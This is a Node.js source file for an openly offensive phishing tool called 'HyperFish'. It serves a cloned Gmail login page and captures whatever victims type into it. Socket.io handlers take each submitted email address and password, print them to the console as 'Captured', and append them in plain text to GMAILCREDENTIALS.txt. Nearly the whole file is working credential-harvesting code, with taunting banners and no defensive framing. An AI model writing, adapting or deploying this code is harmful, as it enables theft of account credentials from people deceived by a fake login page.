var express = require('express');
var app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var colors = require('colors/safe');
const args = require('yargs').argv;
var loki = require('lokijs')
fs = require('fs');
var db = new loki(__dirname + '/db/credentials.json')
var port = args.port
var type = args.kind
var GMAILCREDENTIALS = db.addCollection('GMAIL')

var art1 = `
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝██║  ██║
███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╗  ██║███████╗███████║
██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══╝  ██║╚════██║██╔══██║
██║  ██║   ██║   ██║     ███████╗██║  ██║██║     ██║███████║██║  ██║
╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝`
var art2 = `
_                           ______ _     _     
| |                         |  ____(_)   | |    
| |__  _   _ _ __   ___ _ __| |__   _ ___| |__  
| '_ \| | | | '_ \ / _ \ '__|  __| | / __| '_ \ 
| | | | |_| | |_) |  __/ |  | |    | \__ \ | | |
|_| |_|\__, | .__/ \___|_|  |_|    |_|___/_| |_|
        __/ | |                                 
       |___/|_|                             
`

var sites = [
  'Gmail',

]

var MOTD = [
  'Somethings Fishy',
  'get smooked',
  'Nothing to see here move along',
  'Just conducting an \"Experiment\"',
  'NEMESYS43 WUZ HERE'
]

  var selectedMOTD = MOTD[Math.floor(Math.random() * 5)];


app.get('/', function(req, res){
  /*res.sendFile(__dirname + '/Gmail/index.html' , __dirname + '/Gmail/style.css');
  res.sendFile(__dirname + '/Gmail/grid.png');
  res.sendFile(__dirname + '/Gmail/style.css');
  res.sendFile(__dirname + '/Gmail/profile-img.png');*/
  app.use(express.static(__dirname + '/' + type));
  res.sendFile(__dirname + '/'+ type +'/index.html')
});
    
    
    io.on('connection', function(socket){
        var address = socket.handshake.address;



        console.log(colors.green('[+]') + colors.white(' A user connected from' + address));


        socket.on('GmailEmail',function(email){
          //when user submits email part of gmail form
          
          console.log(colors.green('[+]') + colors.white('Captured Email -> ')+ colors.blue(email));

          //write to file
          fs.appendFile('GMAILCREDENTIALS.txt','\r\n\r\n' + email , function (err) {
            if (err) return console.log(err);
            console.log(colors.green('[+]') + colors.white('Wrote Email To FIle ----> '));
          });


        })
        socket.on('GmailPassword',function(password){
          //when user submits email part of gmail form
          
          console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password));
          

          fs.appendFile('GMAILCREDENTIALS.txt', '\r\n' + password+'', function (err) {
            if (err) return console.log(err);
            console.log(colors.green('[+]') + colors.white('Wrote Password To FIle ----> '));
          });

        })
      });



  app.set('port', process.env.PORT || 3000);
  http.listen(port, function(){
  console.log(colors.blue.bold(art1) + colors.cyan('   by NEMESYS43'))
  console.log(colors.yellow.bold('                       ' + selectedMOTD));
  console.log('\n\n\n')
  

  if (sites.indexOf(type) >= 0) {
    // do stuff here
    console.log(colors.green('[+]') + colors.white(' Found Site '+ type));
    console.log(colors.green('[+]') + colors.white(' listening on *:'+ port));
  }else{
    console.log(colors.red('[!]') + colors.white(' Failed to find Site '+ type));
    console.log(colors.red('[!]') + colors.white(' Quiting'));
    process.exit()
  }
});

